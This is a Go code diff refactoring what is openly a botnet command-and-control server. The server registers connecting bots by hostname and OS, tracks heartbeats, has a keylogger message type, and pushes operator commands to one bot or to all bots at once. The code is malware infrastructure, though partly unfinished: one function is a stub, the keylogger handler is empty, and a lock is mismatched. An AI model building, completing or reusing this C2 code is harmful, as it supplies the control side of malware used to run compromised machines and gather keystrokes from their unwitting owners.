@@ -1,9 +1,10 @@
 package main
 
 import (
+	database "c2/server/db"
+	"c2/server/models"
 	"context"
 	"crypto/rand"
-	"database/sql"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -25,7 +26,7 @@ const (
 )
 
 func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
-	b := Bot{}
+	b := models.Bot{}
 
 	var con *websocket.Conn
 	var err error
@@ -39,12 +40,12 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		log.Println("Error reading the initial data of the bot : ", err)
 		return
 	}
-	b.mu.Lock()
-	b.con = con
+	b.Mu.Lock()
+	b.Con = con
 	b.LastSeen = time.Now()
 	b.Active = true
-	c.registerBot(b.ID, &b)
-	b.mu.Unlock()
+	c.RegisterBot(b.ID, &b)
+	b.Mu.Unlock()
 
 	fmt.Print("BOT ID: ", b.ID, "\nHOSTNAME: ", b.HostName, "\n OS: ", b.OS, "\nLASTSEEN: ", b.LastSeen, "\n")
 
@@ -52,17 +53,17 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 
 }
 
-func (c *c2) listentoBot(bot *Bot) {
+func (c *c2) listentoBot(bot *models.Bot) {
 	defer func() {
 		c.DisconnectBot(bot.ID)
 		log.Println("Deleted the Bot: ", bot.ID, "From the global bot list")
 
 	}()
 
-	var msg BotMessage
+	var msg models.BotMessage
 	for {
 		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
-		err := wsjson.Read(ctx, bot.con, &msg)
+		err := wsjson.Read(ctx, bot.Con, &msg)
 		cancel()
 
 		if err != nil {
@@ -70,27 +71,27 @@ func (c *c2) listentoBot(bot *Bot) {
 			return
 		}
 
-		bot.updateLastseen()
+		bot.UpdateLastseen()
 
 		switch msg.Type {
 		case ERROR_MSG:
-			bot.mu.RLock()
+			bot.Mu.RLock()
 			fmt.Println("ERROR MESSAGE FROM BOT : ", bot.ID, "ERROR : ", msg.Message)
-			bot.mu.RUnlock()
+			bot.Mu.RUnlock()
 
 		case KEYLOGGER:
 
 		case HEARTBEAT:
-			bot.mu.Lock()
+			bot.Mu.Lock()
 			log.Println("Recieved Heartbeat From Bot : ", bot.ID)
-			bot.mu.RUnlock()
+			bot.Mu.RUnlock()
 		}
 
 	}
 }
 
 func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
-	cmd := Command{}
+	cmd := models.Command{}
 	body, err := io.ReadAll(r.Body)
 	if err != nil {
 		log.Println(err)
@@ -100,16 +101,16 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	// fmt.Println(cmd)
 
 	if cmd.BotID == "*" {
-		for _, v := range c.bots {
-			if err = wsjson.Write(context.Background(), v.con, cmd.CmdType); err != nil {
+		for _, v := range c.Bots {
+			if err = wsjson.Write(context.Background(), v.Con, cmd.CmdType); err != nil {
 				log.Println(err)
 				continue
 			}
 			fmt.Println("Command send to bot : ", v.ID)
 		}
 	} else {
-		bot := c.getBot(cmd.BotID)
-		if err = wsjson.Write(context.Background(), bot.con, cmd.CmdType); err != nil {
+		bot := c.GetBot(cmd.BotID)
+		if err = wsjson.Write(context.Background(), bot.Con, cmd.CmdType); err != nil {
 			log.Println(err)
 			return
 		}
@@ -120,9 +121,9 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 
-	c.mu.RLock()
-	defer c.mu.RUnlock()
-	err := json.NewEncoder(w).Encode(c.bots)
+	c.Mu.RLock()
+	defer c.Mu.RUnlock()
+	err := json.NewEncoder(w).Encode(c.Bots)
 	if err != nil {
 		log.Println("Error sending list of bots : ", err)
 		return
@@ -132,7 +133,7 @@ func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 
 func (c *c2) DisconnectBot(botID string) bool {
 	exist := true
-	bot := c.getBot(botID)
+	bot := c.GetBot(botID)
 
 	if bot == nil {
 		exist = false
@@ -140,17 +141,17 @@ func (c *c2) DisconnectBot(botID string) bool {
 		return exist
 	}
 
-	bot.mu.Lock()
-	if err := bot.con.Close(websocket.StatusNormalClosure, "Bot Disconnected"); err != nil {
+	bot.Mu.Lock()
+	if err := bot.Con.Close(websocket.StatusNormalClosure, "Bot Disconnected"); err != nil {
 		log.Println("Error closing connection : ", err)
 		exist = false
 		return exist
 	}
-	bot.mu.Unlock()
-	c.mu.Lock()
-	delete(c.bots, botID)
-	fmt.Println(c.bots)
-	c.mu.Unlock()
+	bot.Mu.Unlock()
+	c.Mu.Lock()
+	delete(c.Bots, botID)
+	fmt.Println(c.Bots)
+	c.Mu.Unlock()
 
 	return exist
 }
@@ -162,36 +163,23 @@ func GenerateBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	SaveToDB(botcreds)
+	database.SaveToDB(botcreds)
 
 }
 
-func GenerateBotCredentials() (BotCreds, error) {
+func GenerateBotCredentials() (models.BotCreds, error) {
 	buf := make([]byte, 32)
 	if _, err := io.ReadFull(rand.Reader, buf); err != nil {
-		return BotCreds{}, err
+		return models.BotCreds{}, err
 	}
 	secretkey := hex.EncodeToString(buf)
 	id := uuid.NewString()
 
-	return BotCreds{
+	return models.BotCreds{
 		ID:        id,
 		SecretKey: secretkey,
 	}, nil
 
 }
 
-func SaveToDB(BotCreds) {
-
-}
-
 func CreateChallenge() string { return "" }
-
-func StartDB() {
-	db, err := sql.Open("sqlite", "bot.db")
-	if err != nil {
-		log.Println("Database connection error : ", err)
-		return
-	}
-
-}
